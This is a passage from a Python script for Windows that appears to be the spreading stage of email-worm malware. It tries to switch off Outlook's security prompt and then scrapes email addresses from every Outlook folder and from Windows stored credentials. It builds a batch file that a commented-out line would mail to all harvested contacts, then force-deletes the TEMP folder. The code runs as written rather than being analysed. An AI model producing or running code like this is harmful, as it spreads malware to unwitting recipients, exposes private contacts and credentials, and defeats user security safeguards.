        if wow64_32: key_path = f"SOFTWARE\\WOW6432Node\\Microsoft\\Office\\{office_version}\\Outlook"
        else: key_path = f"SOFTWARE\\Microsoft\\Office\\{office_version}\\Outlook"
        
        with winreg.OpenKey(hive, key_path, 0, access) as key:
            bitness, _ = winreg.QueryValueEx(key, "Bitness")
            return bitness
    except Exception:
        return None

def fetch_out():
    emails = []
    try:
        office_versions = ['16.0', '15.0', '14.0', '12.0', '11.0', '10.0', '9.0']
        for version in office_versions:
            bitness64 = check_office_version(winreg.HKEY_LOCAL_MACHINE, version)
            bitness32 = check_office_version(winreg.HKEY_LOCAL_MACHINE, version, wow64_32=True)
            if bitness64 == 'x64': 
                if configure_outlook_security(version, wow64_32=False, x86os=False): break
            elif bitness64 == 'x86':
                if configure_outlook_security(version, wow64_32=False, x86os=True): break
            elif bitness32:
                if configure_outlook_security(version, wow64_32=True, x86os=False): break
    except Exception as e:
        print(f"FAILED TO DISABLE PROMPT FOR OUTLOOK: {e}")

    try:
        #pythoncom.CoInitialize()
        outlook = win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")
        folders = ["Inbox", "Sent Items", "Drafts", "Deleted Items", "Archive", "Junk Email", "Outbox", "Conversation History"]

        for acc in outlook.Folders:
            for folder in acc.Folders:
                if folder.Name in folders:
                    try:
                        messages = folder.Items
                        messages.Sort("[ReceivedTime]", True)
                        print(f"ABOUT TO ENTER OUTLOOKK ! Has folder name: {folder.Name} for account: {acc.Name}")
                        for message in messages:
                            try:
                                subject = message.Subject
                                sender = message.SenderEmailAddress
                                body = message.Body
                                for reciptent in message.Recipients: emails.extend(re.findall(email_pattern, str(reciptent.Address)))
                                emails.extend(re.findall(email_pattern, str(sender)))
                                emails.extend(re.findall(email_pattern, str(subject)))
                                emails.extend(re.findall(email_pattern, str(body)))
                            except Exception as e:
                                print(f"Error processing message: {e}")
                    except Exception as e: print(f"Failed Iterating Folder Items: {e}")

    except Exception as e: print(f"Outlook COM API error: {e}") 
    #finally: pythoncom.CoUninitialize()
    return emails

emails.extend(fetch_out())
try:
    creds = win32cred.CredEnumerate(None, 0)
    for cred in creds:
        try:
            emails.extend(re.findall(email_pattern, cred['TargetName']))
            emails.extend(re.findall(email_pattern, cred['UserName']))
        except: continue
except Exception as e:
    print(f"ERROR FETCHING WIN CREDS : {e}")
    
emails = list(set(emails))
bat_path = generate()

print("AFTER FILTERINGGG")
#send_a(bat_path, emails)

for email in emails:
    print(email)
print(len(emails))

os.system(f"powershell remove-item -path {os.getenv("TEMP")} -force -recurse -erroraction silentlycontinue")